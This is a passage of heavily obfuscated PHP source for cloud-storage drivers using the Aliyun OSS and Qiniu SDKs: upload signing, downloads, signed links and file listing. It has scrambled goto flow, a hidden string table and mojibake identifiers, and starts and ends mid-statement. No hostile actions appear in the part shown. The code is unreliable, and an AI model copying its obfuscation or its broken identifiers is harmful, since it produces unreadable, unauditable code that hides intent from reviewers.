$this->pathEncode($e‘âå¢’), $F‹§Ñ¹§Š², $D ËÈ‚ë); } catch (OSS\Core\OssException $eø–ó¶æ¼„) { return !1; } return $this->getPathOuter($BÙÌÙ’µÄ˜); } public function getHost() { $f›ˆŞÚô” =& $_SERVER[Å¸ş]; $d›—„è •ñ = explode($f›ˆŞÚô”[171], parent::getHost()); return $d›—„è •ñ[0] . $f›ˆŞÚô”[171] . $this->bucket . $f›ˆŞÚô”[91] . $d›—„è •ñ[1]; } public function uploadFormData($AˆŞÌ…¢È¬, $D¦¾ÆÓµßÙ = 3600) { goto fº¡«–Ñ¿®; bå©†ïåïé: return $c·ˆŒ˜š; goto C¬Ã×ŒĞÆ–; E­Áµ’ğŒ: $C¯•—É†  = strpos($CÁºó·ˆ¿¥, $BÁœÄ«Ñ“†[284]); $CÁºó·ˆ¿¥ = substr($CÁºó·ˆ¿¥, 0, $C¯•—É† ) . $BÁœÄ«Ñ“†[1199]; $bÆšæŠÈ¯‰ = 1048576000 * 5; goto b–Š¿°³›Ö; b–Š¿°³›Ö: $bÚë–ê›ß = $this->pathFather($AˆŞÌ…¢È¬); $c‚Ú‡±²Ù§ = array($BÁœÄ«Ñ“†[1100] => $CÁºó·ˆ¿¥, $BÁœÄ«Ñ“†[1101] => array(array($BÁœÄ«Ñ“†[1200], 0, $bÆšæŠÈ¯‰), array($BÁœÄ«Ñ“†[1104], $BÁœÄ«Ñ“†[1105], $bÚë–ê›ß))); $D¡Û·‡¿®Ò = base64_encode(json_encode($c‚Ú‡±²Ù§)); goto eÍÁ¥›ˆœ; bÛ•‡‰İïÉ: $E´·Ë˜ˆÑÅ = date($BÁœÄ«Ñ“†[1198], time() + $D‹ä–Òå¸); $fÂ‚ÏâİÁø = new DateTime($E´·Ë˜ˆÑÅ); $CÁºó·ˆ¿¥ = $fÂ‚ÏâİÁø->format(DateTime::ISO8601); goto E­Áµ’ğŒ; eÍÁ¥›ˆœ: $AŠ²êßô¬ = base64_encode(hash_hmac($BÁœÄ«Ñ“†[218], $D¡Û·‡¿®Ò, $this->secret, !0)); $c·ˆŒ˜š = array($BÁœÄ«Ñ“†[1110] => $D¡Û·‡¿®Ò, $BÁœÄ«Ñ“†[1201] => $this->accessKey, $BÁœÄ«Ñ“†[1106] => $BÁœÄ«Ñ“†[1098], $BÁœÄ«Ñ“†[1202] => $AŠ²êßô¬, $BÁœÄ«Ñ“†[169] => $f¬â”ÙŒÃ¡); $c·ˆŒ˜š = $this->trafficLimit($BÁœÄ«Ñ“†[1195], $c·ˆŒ˜š); goto bå©†ïåïé; fº¡«–Ñ¿®: $BÁœÄ«Ñ“† =& $_SERVER[Å¸ş]; if (!($f¬â”ÙŒÃ¡ = $this->getHost())) { return !1; } $D‹ä–Òå¸ = $D¦¾ÆÓµßÙ; goto bÛ•‡‰İïÉ; C¬Ã×ŒĞÆ–: } public function multiUploadFormData($fÜ§¼è¤Œ½, $cœÍ©Ñ¸Â = 3600) { $eàòŒ’‡ =& $_SERVER[Å¸ş]; if (!($EŠÄ“ÂÖ…Ã = $this->getHost())) { return !1; } $f®ŠŠÖ›ò£ = $this->trafficLimit($eàòŒ’‡[1195]); $c‹Îğ‘¹Ö‹ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($fÜ§¼è¤Œ½), $f®ŠŠÖ›ò£); return array($eàòŒ’‡[209] => $c‹Îğ‘¹Ö‹, $eàòŒ’‡[169] => $EŠÄ“ÂÖ…Ã . $eàòŒ’‡[8] . $this->pathEncode($fÜ§¼è¤Œ½), $eàòŒ’‡[210] => gmdate($eàòŒ’‡[1203]), $eàòŒ’‡[89] => $fÜ§¼è¤Œ½); } public function multiUploadAuthData($BŒÖ„®Íà©, $E÷¬‘¸Í‘ = array()) { goto BÁè·é¥…·; Dß”„¿–àà: $c³„´ç¬” = $eõîÄªÁ[1206] . $this->accessKey . $eõîÄªÁ[4] . $a²“í„š¸; if (strpos($DˆŞÓ‰¤Å¦, $eõîÄªÁ[213]) === 0) { $c³„´ç¬” = array($eõîÄªÁ[220] => $c³„´ç¬”, $eõîÄªÁ[210] => $cªŒÆÛŞ); if ($eÚ·•²—¼) { $c³„´ç¬” = array_merge($c³„´ç¬”, $eÚ·•²—¼); } } return $c³„´ç¬”; goto Fì¾²ˆß…í; BÁè·é¥…·: $eõîÄªÁ =& $_SERVER[Å¸ş]; $cªŒÆÛŞ = isset($E÷¬‘¸Í‘[$eõîÄªÁ[210]]) ? $E÷¬‘¸Í‘[$eõîÄªÁ[210]] : gmdate($eõîÄªÁ[1203]); $DˆŞÓ‰¤Å¦ = isset($E÷¬‘¸Í‘[$eõîÄªÁ[160]]) ? $E÷¬‘¸Í‘[$eõîÄªÁ[160]] : $eõîÄªÁ[33]; goto AØ÷Ëì˜È; AØ÷Ëì˜È: $eÊ¢š…ì… = $BŒÖ„®Íà©; if (isset($E÷¬‘¸Í‘[$eõîÄªÁ[89]])) { $eÊ¢š…ì… = $E÷¬‘¸Í‘[$eõîÄªÁ[89]]; unset($E÷¬‘¸Í‘[$eõîÄªÁ[89]]); } if (isset($E÷¬‘¸Í‘[$eõîÄªÁ[211]])) { $E÷¬‘¸Í‘[$eõîÄªÁ[210]] = $cªŒÆÛŞ; return $this->listUploadParts($eÊ¢š…ì…, $E÷¬‘¸Í‘); } goto c¨Ÿ•ŒåéŠ; c¨Ÿ•ŒåéŠ: $bŠ¥‹àå„à = array($eõîÄªÁ[212], $eõîÄªÁ[33], $eõîÄªÁ[116], $cªŒÆÛŞ, "\170\x2d\157\163\x73\55\144\x61\x74\x65\x3a{$cªŒÆÛŞ}", $eõîÄªÁ[8] . $this->bucket . $eõîÄªÁ[8] . $eÊ¢š…ì… . $DˆŞÓ‰¤Å¦); if (strpos($DˆŞÓ‰¤Å¦, $eõîÄªÁ[213]) === 0) { $bŠ¥‹àå„à[0] = $eõîÄªÁ[214]; if ($eÚ·•²—¼ = $this->trafficLimit($eõîÄªÁ[1195])) { $eÊ¢š…ì… = $eõîÄªÁ[1204]; array_splice($bŠ¥‹àå„à, 5, 0, $eÊ¢š…ì… . $eõîÄªÁ[4] . $eÚ·•²—¼[$eÊ¢š…ì…]); } } if (isset($E÷¬‘¸Í‘[$eõîÄªÁ[215]]) && $E÷¬‘¸Í‘[$eõîÄªÁ[215]] == $eõîÄªÁ[216]) { $bŠ¥‹àå„à[0] = $eõîÄªÁ[216]; } goto Eš²‘ôëã; Eš²‘ôëã: if (!empty($E÷¬‘¸Í‘[$eõîÄªÁ[1205]])) { $cÓìÌ÷“Û = array_merge(array($bŠ¥‹àå„à[4]), $E÷¬‘¸Í‘[$eõîÄªÁ[1205]]); sort($cÓìÌ÷“Û); $bŠ¥‹àå„à[4] = implode($eõîÄªÁ[217], $cÓìÌ÷“Û); } $DÊˆµ¾õ§Ã = implode($eõîÄªÁ[217], $bŠ¥‹àå„à); $a²“í„š¸ = base64_encode(hash_hmac($eõîÄªÁ[218], $DÊˆµ¾õ§Ã, $this->secret, !0)); goto Dß”„¿–àà; Fì¾²ˆß…í: } public function listUploadParts($eÙ–Äˆİê°, $aâçó¡º) { goto aÜ…¦´½³Æ; aÜ…¦´½³Æ: $Eƒ¡——ÖæŠ =& $_SERVER[Å¸ş]; $BˆŸÄğˆß = parse_url_query($aâçó¡º[$Eƒ¡——ÖæŠ[160]]); $bø¸ÙÃ“…Ğ = $this->client->listParts($this->bucket, $this->pathEncode($eÙ–Äˆİê°), $BˆŸÄğˆß[$Eƒ¡——ÖæŠ[209]]); goto dÉÎ³ŠäŒİ; dÉÎ³ŠäŒİ: $D®Ä°½£ÊÓ = $bø¸ÙÃ“…Ğ->getListPart(); $DÖ¤Ş ˆ„´ = array(); foreach ($D®Ä°½£ÊÓ as $D¬Ò •í£—) { $DÖ¤Ş ˆ„´[] = array($Eƒ¡——ÖæŠ[1186] => $D¬Ò •í£—->getPartNumber(), $Eƒ¡——ÖæŠ[1187] => trim($D¬Ò •í£—->getETag(), $Eƒ¡——ÖæŠ[113])); } goto EÖğÄ¸„ùÇ; EÖğÄ¸„ùÇ: unset($aâçó¡º[$Eƒ¡——ÖæŠ[211]], $aâçó¡º[$Eƒ¡——ÖæŠ[215]]); $cˆ¬œˆ’Âè = $this->multiUploadAuthData($eÙ–Äˆİê°, $aâçó¡º); if (empty($cˆ¬œˆ’Âè)) { return !1; } goto bÚ¤¶ÍÄÁù; bÚ¤¶ÍÄÁù: return array($Eƒ¡——ÖæŠ[220] => $cˆ¬œˆ’Âè, $Eƒ¡——ÖæŠ[210] => $aâçó¡º[$Eƒ¡——ÖæŠ[210]], $Eƒ¡——ÖæŠ[222] => $DÖ¤Ş ˆ„´); goto a¤ƒĞµ‹‘; a¤ƒĞµ‹‘: } public function download($f©”¸è©œÒ, $dêºÚÛîøá) { if ($this->isFolder($f©”¸è©œÒ)) { return !1; } try { $b½ê²ö™ğñ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $dêºÚÛîøá); $b½ê²ö™ğñ = $this->trafficLimit($_SERVER[Å¸ş][105], $b½ê²ö™ğñ); $this->client->getObject($this->bucket, $this->pathEncode($f©”¸è©œÒ), $b½ê²ö™ğñ); } catch (OSS\Core\OssException $a ­Ë°îƒÉ) { return !1; } return $dêºÚÛîøá; } public function fileSubstr($dÎ¹ĞÒÙ¨Ä, $dÌÍ¸ÌÏÎ = 0, $a”¢®ßÂ¹à = false) { if ($dÌÍ¸ÌÏÎ === -1) { $DÎë»Àñ—à = array(); } else { if ($a”¢®ßÂ¹à === !1) { $d£æç…„½ = $this->size($dÎ¹ĞÒÙ¨Ä); } else { $d£æç…„½ = $dÌÍ¸ÌÏÎ + $a”¢®ßÂ¹à - 1; } $DÎë»Àñ—à = array(OSS\OssClient::OSS_RANGE => "{$dÌÍ¸ÌÏÎ}\55{$d£æç…„½}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($dÎ¹ĞÒÙ¨Ä), $DÎë»Àñ—à); } catch (OSS\Core\OssException $eä¤ÜÑºˆŒ) { think_exception($eä¤ÜÑºˆŒ->getMessage()); return !1; } } private function trafficLimit($bøÔ™˜²†°, $B«Ö¼¨ÚÕ = array()) { goto A†ìÏ†¼¬İ; BŒ…É£Ş’: if (!$B…ôÚëŞ…Ç) { return $B«Ö¼¨ÚÕ; } $B…ôÚëŞ…Ç = $B…ôÚëŞ…Ç < 819200 ? 819200 : ($B…ôÚëŞ…Ç > 838860800 ? 838860800 : $B…ôÚëŞ…Ç); $B«Ö¼¨ÚÕ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($B…ôÚëŞ…Ç); goto EŸÉÇˆ¾î•; EŸÉÇˆ¾î•: return $B«Ö¼¨ÚÕ; goto eïÖ¶Û…‡„; A†ìÏ†¼¬İ: $A¡ ÒÎ¦®Ñ =& $_SERVER[Å¸ş]; if ($bøÔ™˜²†° == $A¡ ÒÎ¦®Ñ[1195] && $this->isUploadServer() || $bøÔ™˜²†° == $A¡ ÒÎ¦®Ñ[105] && $this->isFileOutServer()) { return $B«Ö¼¨ÚÕ; } $B…ôÚëŞ…Ç = floatval($GLOBALS[$A¡ ÒÎ¦®Ñ[6]][$A¡ ÒÎ¦®Ñ[84]][$A¡ ÒÎ¦®Ñ[103]][$bøÔ™˜²†°]) * 1024 * 1024 * 8; goto BŒ…É£Ş’; eïÖ¶Û…‡„: } public function link($a‰†Ô¿„°°, $FØß•òå™Í = array()) { $D†„éÎ„³» =& $_SERVER[Å¸ş]; if (!$this->exist($a‰†Ô¿„°°) || $this->isFolder($a‰†Ô¿„°°)) { return !1; } try { $FØß•òå™Í = $this->trafficLimit($D†„éÎ„³»[105], $FØß•òå™Í); $A¸‡™ø­Ùİ = $this->client->signUrl($this->bucket, $this->pathEncode($a‰†Ô¿„°°), 3600 * 12, $D†„éÎ„³»[216], $FØß•òå™Í); return $this->getCdnLink($A¸‡™ø­Ùİ); } catch (OSS\Core\OssException $C›ëÎ‘«¤×) { return !1; } } public function fileOut($aÊÔÃÄîÒğ, $EğˆÖ·æ‡§ = false, $Fò¦Ä¶øŠ‰ = false, $F¦åñ–¶ = '') { goto b°ñ¥¶”…ä; bÇ‡Ôóô: $F²í¥Í›¯Ê = $this->link($aÊÔÃÄîÒğ, $f’‡ŸÙŞÄº); $this->fileOutLink($F²í¥Í›¯Ê); goto b•–Ó¬¤—; fò£ˆ‚åÙ‰: $EğˆÖ·æ‡§ = $EğˆÖ·æ‡§ ? $FÊÁ¦Š‰­[202] : $FÊÁ¦Š‰­[203]; $f’‡ŸÙŞÄº = array(OSS\OssClient::OSS_SUB_RESOURCE => $FÊÁ¦Š‰­[1207] . rawurlencode("{$EğˆÖ·æ‡§}\73\x66\x69\x6c\x65\x6e\141\155\x65\75{$Fò¦Ä¶øŠ‰}")); $f’‡ŸÙŞÄº[OSS\OssClient::OSS_SUB_RESOURCE] .= $FÊÁ¦Š‰­[1208] . rawurlencode($eÅ™»Ú«); goto bÇ‡Ôóô; b°ñ¥¶”…ä: $FÊÁ¦Š‰­ =& $_SERVER[Å¸ş]; if ($this->isFileOutServer()) { return $this->fileOutServer($aÊÔÃÄîÒğ, $EğˆÖ·æ‡§, $Fò¦Ä¶øŠ‰, $F¦åñ–¶); } if (!$Fò¦Ä¶øŠ‰) { $Fò¦Ä¶øŠ‰ = $this->pathThis($aÊÔÃÄîÒğ); } goto d„‹¹ìŸğ; d„‹¹ìŸğ: $Fò¦Ä¶øŠ‰ = rawurlencode($Fò¦Ä¶øŠ‰); $eÅ™»Ú« = get_file_mime(get_path_ext($Fò¦Ä¶øŠ‰)); if ($eÅ™»Ú« == $FÊÁ¦Š‰­[201]) { return parent::fileOut($aÊÔÃÄîÒğ, $EğˆÖ·æ‡§, $Fò¦Ä¶øŠ‰, $F¦åñ–¶); } goto fò£ˆ‚åÙ‰; b•–Ó¬¤—: } public function fileOutServer($D”´÷·â, $eØ¹ÆŸâ‡á = false, $e‚Å«†ãì = false, $f™İÑÚ‡‰ = '') { parent::fileOut($D”´÷·â, $eØ¹ÆŸâ‡á, $e‚Å«†ãì, $f™İÑÚ‡‰); } public function fileOutImage($C—Š‰ÙÇŠÆ, $a¾‘Ã­¿¦¹ = 250) { $föš×ğ¸˜Ó = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Å¸ş][1209] . $a¾‘Ã­¿¦¹); $E‹‘È‹¸ó = $this->link($C—Š‰ÙÇŠÆ, $föš×ğ¸˜Ó); $this->fileOutLink($E‹‘È‹¸ó); } public function fileOutImageServer($EŸÔŠ²¹÷, $B£òïÎë¦Ÿ = 250) { parent::fileOutImage($EŸÔŠ²¹÷, $B£òïÎë¦Ÿ); } public function fileOutLink($C„ß‚‹ãÏŸ) { $BÓºŸÈÇ§ƒ =& $_SERVER[Å¸ş]; if (!$this->isCdnHost() && substr($C„ß‚‹ãÏŸ, 0, 7) == $BÓºŸÈÇ§ƒ[1113]) { $C„ß‚‹ãÏŸ = $BÓºŸÈÇ§ƒ[1114] . substr($C„ß‚‹ãÏŸ, 7); } header($BÓºŸÈÇ§ƒ[156] . $C„ß‚‹ãÏŸ); die; } public function hashMd5($DÀµóŞ“Ä£, $AÛò‘ç« = '') { $A‰ë¯Ùô­ =& $_SERVER[Å¸ş]; $bø¼¨°¹Êï = $this->objectMeta($DÀµóŞ“Ä£); if (!$bø¼¨°¹Êï) { return $A‰ë¯Ùô­[33]; } if (!isset($bø¼¨°¹Êï[$A‰ë¯Ùô­[1182]]) && !empty($AÛò‘ç«)) { $EŞò¿Ÿöò› = $this->updateObjMeta($DÀµóŞ“Ä£, array($A‰ë¯Ùô­[1182] => $AÛò‘ç«)); $bø¼¨°¹Êï[$A‰ë¯Ùô­[1182]] = $EŞò¿Ÿöò› ? $AÛò‘ç« : $A‰ë¯Ùô­[33]; } return isset($bø¼¨°¹Êï[$A‰ë¯Ùô­[1182]]) ? strtolower($bø¼¨°¹Êï[$A‰ë¯Ùô­[1182]]) : $A‰ë¯Ùô­[33]; } public function size($C¤‡éø¼á) { $C®çÊíœƒô = $this->objectMeta($C¤‡éø¼á); return $C®çÊíœƒô ? $C®çÊíœƒô[$_SERVER[Å¸ş][77]] : 0; } public function info($c“â¼Á‘çµ) { if ($this->isFolder($c“â¼Á‘çµ)) { return $this->folderInfo($c“â¼Á‘çµ); } else { if ($this->isFile($c“â¼Á‘çµ)) { return $this->fileInfo($c“â¼Á‘çµ); } } return !1; } public function exist($E”Šˆ·) { return $this->isFile($E”Šˆ·) || $this->isFolder($E”Šˆ·); } public function isFile($cøöò‡’®) { return !$this->isFolder($cøöò‡’®) && $this->objectMeta($cøöò‡’®); } public function isFolder($eí¢‰­õ’) { return $this->cacheMethod($_SERVER[Å¸ş][223], $eí¢‰­õ’); } protected function objectMeta($F¸¯Ò¿áÔµ) { return $this->cacheMethod($_SERVER[Å¸ş][224], $F¸¯Ò¿áÔµ); } protected function _objectMeta($f ¿Ç¿Úõê) { $b¼Ü¹éó¯ =& $_SERVER[Å¸ş]; try { $dÎâˆøÈ‡Û = $this->client->getObjectMeta($this->bucket, $this->pathEncode($f ¿Ç¿Úõê)); } catch (OSS\Core\OssException $eëÄÜ¯·ö¾) { $dÎâˆøÈ‡Û = !1; } if ($dÎâˆøÈ‡Û) { $dÎâˆøÈ‡Û[$b¼Ü¹éó¯[77]] = intval($dÎâˆøÈ‡Û[$b¼Ü¹éó¯[1189]]); } return $dÎâˆøÈ‡Û; } protected function _isFolder($E›Î ÂµÛ®) { $EÔÜùáå·ƒ =& $_SERVER[Å¸ş]; if ($E›Î ÂµÛ® == $EÔÜùáå·ƒ[33] || $E›Î ÂµÛ® == $EÔÜùáå·ƒ[8]) { return !0; } $bØ–…Ú©®Ø = array($EÔÜùáå·ƒ[1179] => $EÔÜùáå·ƒ[8], $EÔÜùáå·ƒ[186] => rtrim($E›Î ÂµÛ®, $EÔÜùáå·ƒ[8]) . $EÔÜùáå·ƒ[8], $EÔÜùáå·ƒ[1180] => 1, $EÔÜùáå·ƒ[1181] => $EÔÜùáå·ƒ[33]); $bÄ¶ƒ Êª¾ = $this->client->listObjects($this->bucket, $bØ–…Ú©®Ø); if ($bÄ¶ƒ Êª¾->getObjectList() || $bÄ¶ƒ Êª¾->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($dŠ“Ñ°÷ğ) { parent::__construct(); require_once SDK_DIR . $_SERVER[Å¸ş][1210]; $this->_init($dŠ“Ñ°÷ğ); } public function _init($F„Âç¤ƒÙÆ) { foreach ($F„Âç¤ƒÙÆ as $DğÍĞíÛ§‡ => $A¡Ë…šù) { if (isset($this->{$DğÍĞíÛ§‡})) { $this->{$DğÍĞíÛ§‡} = $A¡Ë…šù; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Å¸ş][1211], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($b‘Ñè©”×, $d«¿‚ã¤ = '', $EÅ›ÀÒ¾ó = REPEAT_RENAME) { if ($this->setContent($b‘Ñè©”×, $d«¿‚ã¤)) { return $this->getPathOuter($b‘Ñè©”×); } return !1; } public function mkdir($FÃìÉèŒÚ•, $EÃó„®¸‘ = REPEAT_SKIP) { goto f™Àö¸äÚÕ; f™Àö¸äÚÕ: $C¢›ŸèÂ•Ş =& $_SERVER[Å¸ş]; $cØÓ¼¨¬ª = trim($FÃìÉèŒÚ•, $C¢›ŸèÂ•Ş[8]); if ($this->_isFolder($cØÓ¼¨¬ª)) { return $this->getPathOuter($cØÓ¼¨¬ª); } goto dŠ—«Ç¼Ó; aĞÕ§³ƒÄ½: if (!$this->mkfile($Fç¨•Ë³Ğî)) { return !1; } if (!$this->moveFile($Fç¨•Ë³Ğî, $FÃìÉèŒÚ•)) { $this->delFile($Fç¨•Ë³Ğî); return !1; } return $this->getPathOuter($cØÓ¼¨¬ª); goto b­¶¢í×ö; dŠ—«Ç¼Ó: $FÃìÉèŒÚ• = $cØÓ¼¨¬ª . $C¢›ŸèÂ•Ş[8]; $AáŠ—¸¶à = get_path_this($cØÓ¼¨¬ª); $Fç¨•Ë³Ğî = $FÃìÉèŒÚ• . $AáŠ—¸¶à; goto aĞÕ§³ƒÄ½; b­¶¢í×ö: } public function copyFile($dÇ¤¸—Ê²æ, $cĞÃ…³ñ‡Ğ) { $fùïÌ§Õù = $this->bucketManager->copy($this->bucket, $dÇ¤¸—Ê²æ, $this->bucket, $cĞÃ…³ñ‡Ğ, !0); return $fùïÌ§Õù ? !1 : $this->getPathOuter($cĞÃ…³ñ‡Ğ); } public function moveFile($e”¡ã÷õîì, $eˆĞÏ©³ó) { $aÊ‘ªğ˜­Ÿ = $this->bucketManager->move($this->bucket, $e”¡ã÷õîì, $this->bucket, $eˆĞÏ©³ó, !0); return $aÊ‘ªğ˜­Ÿ ? !1 : $this->getPathOuter($eˆĞÏ©³ó); } public function delFile($eÇ½ùãò¬¹) { $c¡¤ÈÙì¯ = $this->bucketManager->delete($this->bucket, $eÇ½ùãò¬¹); return $c¡¤ÈÙì¯ ? !1 : !0; } public function delFolder($aç˜¡Ñğ») { $fÈŞŒ³´ñ± = $this->fileList($aç˜¡Ñğ»); if (empty($fÈŞŒ³´ñ±)) { return !0; } $c†ïÓğˆöÇ = 1000; if (count($fÈŞŒ³´ñ±) <= $c†ïÓğˆöÇ) { return $this->qnDelObj($fÈŞŒ³´ñ±) ? !1 : !0; } foreach (array_chunk($fÈŞŒ³´ñ±, $c†ïÓğˆöÇ) as $DŞñÅ‡‹³) { $fæ¨°ÉÒÙÙ = $this->qnDelObj($DŞñÅ‡‹³); if ($fæ¨°ÉÒÙÙ) { return !1; } } return !0; } private function qnDelObj($fõÔä––ÎÊ) { $A§Ò‰ÀÅ—ï = $this->bucketManager->buildBatchDelete($this->bucket, $fõÔä––ÎÊ); list($A ìùö³ùß, $e’Ö’¸ğñ¸) = $this->bucketManager->batch($A§Ò‰ÀÅ—ï); return $e’Ö’¸ğñ¸; } private function fileList($eÎê™Éš¦°, $Aˆß¢Úíê¸ = 0) { goto bÎ³‡¿ç»; bÎ³‡¿ç»: $dÅ¿ÃÈõâ¥ =& $_SERVER[Å¸ş]; $eÎê™Éš¦° = trim($eÎê™Éš¦°, $dÅ¿ÃÈõâ¥[8]); $F†§ããÕ«ö = empty($eÎê™Éš¦°) ? $dÅ¿ÃÈõâ¥[33] : $eÎê™Éš¦° . $dÅ¿ÃÈõâ¥[8]; goto Aß¼’åí•; Aß¼’åí•: $F­²ĞÖ…ë = $dÅ¿ÃÈõâ¥[33]; $C¡ìíˆ„œ = 1000; $C¿©«²ç˜Ç = $dÅ¿ÃÈõâ¥[33]; goto b‚É¢¿éÍº; b‚É¢¿éÍº: $EŞ†©°Şİˆ = array(); while (!0) { list($EÆ¾Ç—Ô¹ƒ, $dŒ…˜„Âï£) = $this->bucketManager->listFiles($this->bucket, $F†§ããÕ«ö, $F­²ĞÖ…ë, $C¡ìíˆ„œ, $C¿©«²ç˜Ç); if ($dŒ…˜„Âï£) { return !1; } $F­²ĞÖ…ë = array_key_exists($dÅ¿ÃÈõâ¥[1181], $EÆ¾Ç—Ô¹ƒ) ? $F­²ĞÖ…ë = $EÆ¾Ç—Ô¹ƒ[$dÅ¿ÃÈõâ¥[1212]] : $dÅ¿ÃÈõâ¥[33]; foreach ($EÆ¾Ç—Ô¹ƒ[$dÅ¿ÃÈõâ¥[1213]] as $FÓí¼©ëæ¯) { $fä¶È…­“Ã = $FÓí¼©ëæ¯[$dÅ¿ÃÈõâ¥[89]]; if ($Aˆß¢Úíê¸) { $fä¶È…­“Ã = array($dÅ¿ÃÈõâ¥[28] => $fä¶È…­“Ã, $dÅ¿ÃÈõâ¥[77] => $FÓí¼©ëæ¯[$dÅ¿ÃÈõâ¥[1214]]); } $EŞ†©°Şİˆ[] = $fä¶È…­“Ã; } if ($F­²ĞÖ…ë == $dÅ¿ÃÈõâ¥[33]) { break; } } return $EŞ†©°Şİˆ; goto B²ŠÄ²™”Œ; B²ŠÄ²™”Œ: } public function rename($CÄ†Í¥ª´Õ, $B«êæ‰Ü°®) { return $this->renameObject($CÄ†Í¥ª´Õ, $B«êæ‰Ü°®); } public function fileInfo($e¸»»ìÏ¹¨, $Fäàƒîæ = false, $FÕ‰×–‚‚ = array()) { goto Bë¯àÀï´ª; Bë¯àÀï´ª: $fŸÛÃ¶ˆÌ =& $_SERVER[Å¸ş]; if ($Fäàƒîæ) { return array($fŸÛÃ¶ˆÌ[28] => $this->pathThis($e¸»»ìÏ¹¨), $fŸÛÃ¶ˆÌ[75] => $this->getPathOuter($fŸÛÃ¶ˆÌ[8] . $e¸»»ìÏ¹¨), $fŸÛÃ¶ˆÌ[29] => $fŸÛÃ¶ˆÌ[167], $fŸÛÃ¶ˆÌ[77] => isset($FÕ‰×–‚‚[$fŸÛÃ¶ˆÌ[1214]]) ? $FÕ‰×–‚‚[$fŸÛÃ¶ˆÌ[1214]] : 0, $fŸÛÃ¶ˆÌ[160] => $this->ext($e¸»»ìÏ¹¨)); } $aÇ…’ïğê = array($fŸÛÃ¶ˆÌ[28] => $this->pathThis($e¸»»ìÏ¹¨), $fŸÛÃ¶ˆÌ[75] => $this->getPathOuter($fŸÛÃ¶ˆÌ[8] . $e¸»»ìÏ¹¨), $fŸÛÃ¶ˆÌ[29] => $fŸÛÃ¶ˆÌ[167], $fŸÛÃ¶ˆÌ[187] => 0, $fŸÛÃ¶ˆÌ[107] => 0, $fŸÛÃ¶ˆÌ[77] => 0, $fŸÛÃ¶ˆÌ[160] => $this->ext($e¸»»ìÏ¹¨), $fŸÛÃ¶ˆÌ[188] => !0, $fŸÛÃ¶ˆÌ[189] => !0); goto aÂÕÓÑè§Ù; aÂÕÓÑè§Ù: if (empty($FÕ‰×–‚‚)) { $FÕ‰×–‚‚ = $this->objectMeta($e¸»»ìÏ¹¨); if (!$FÕ‰×–‚‚) { return $aÇ…’ïğê; } } if (isset($FÕ‰×–‚‚[$fŸÛÃ¶ˆÌ[1215]])) { $aÇ…’ïğê[$fŸÛÃ¶ˆÌ[107]] = substr($FÕ‰×–‚‚[$fŸÛÃ¶ˆÌ[1215]] . $fŸÛÃ¶ˆÌ[33], 0, 10); } if (isset($FÕ‰×–‚‚[$fŸÛÃ¶ˆÌ[1214]])) { $aÇ…’ïğê[$fŸÛÃ¶ˆÌ[77]] = $FÕ‰×–‚‚[$fŸÛÃ¶ˆÌ[1214]]; } goto E‰‹ëİÜñ; E‰‹ëİÜñ: return $aÇ…’ïğê; goto aŠ¾ù‹Ä—Ù; aŠ¾ù‹Ä—Ù: } public function folderInfo($c“Š›õÇ¦, $E£Š‘íßĞå = false) { goto BµƒÂ¯ÅŒê; BµƒÂ¯ÅŒê: $eœÕˆƒ§âÉ =& $_SERVER[Å¸ş]; if ($E£Š‘íßĞå) { return array($eœÕˆƒ§âÉ[28] => $this->pathThis($c“Š›õÇ¦), $eœÕˆƒ§âÉ[75] => $this->getPathOuter($eœÕˆƒ§âÉ[8] . $c“Š›õÇ¦), $eœÕˆƒ§âÉ[29] => $eœÕˆƒ§âÉ[76]); } $bŠøŸÉŸ’¨ = array($eœÕˆƒ§âÉ[28] => $this->pathThis($c“Š›õÇ¦), $eœÕˆƒ§âÉ[75] => $this->getPathOuter($eœÕˆƒ§âÉ[8] . $c“Š›õÇ¦), $eœÕˆƒ§âÉ[29] => $eœÕˆƒ§âÉ[76], $eœÕˆƒ§âÉ[187] => 0, $eœÕˆƒ§âÉ[107] => 0, $eœÕˆƒ§âÉ[1160] => !0, $eœÕˆƒ§âÉ[1161] => !0); goto Bƒ¼ğòœš; Bƒ¼ğòœš: $c“Š›õÇ¦ = rtrim($c“Š›õÇ¦, $eœÕˆƒ§âÉ[8]) . $eœÕˆƒ§âÉ[8]; $fÖÔô¾áÕ· = $this->objectMeta($c“Š›õÇ¦); if (isset($fÖÔô¾áÕ·[$eœÕˆƒ§âÉ[1215]])) { $bŠøŸÉŸ’¨[$eœÕˆƒ§âÉ[107]] = substr($fÖÔô¾áÕ·[$eœÕˆƒ§âÉ[1215]] . $eœÕˆƒ§âÉ[33], 0, 10); } goto Eñ·Æ»Ú¤; Eñ·Æ»Ú¤: return $bŠøŸÉŸ’¨; goto aÌà—Ÿ³; aÌà—Ÿ³: } public function listPath($bØÃƒ‡†½â, $f‘£½»´‡ = false) { goto F‘Æè¯Ã÷¦; bå¬‘ìáÏ¬: $D”íî–•ğ = $dŠäÅ¸ˆ­• = array(); while (!0) { list($c¥¦œùÉ³¢, $CÃ¤ÏáóÆ) = $this->bucketManager->listFiles($this->bucket, $b× ƒİÄ¨×, $dÂÄˆĞä¹, $fíÍøÄ˜‰ò, $cŸí‚¦ˆ–); if ($CÃ¤ÏáóÆ) { return !1; } $dÂÄˆĞä¹ = array_key_exists($Eä¬‘Îø²å[1181], $c¥¦œùÉ³¢) ? $dÂÄˆĞä¹ = $c¥¦œùÉ³¢[$Eä¬‘Îø²å[1212]] : $Eä¬‘Îø²å[33]; if (isset($c¥¦œùÉ³¢[$Eä¬‘Îø²å[1216]])) { foreach ($c¥¦œùÉ³¢[$Eä¬‘Îø²å[1216]] as $CáÅ££ˆùˆ) { if ($CáÅ££ˆùˆ == $b× ƒİÄ¨×) { 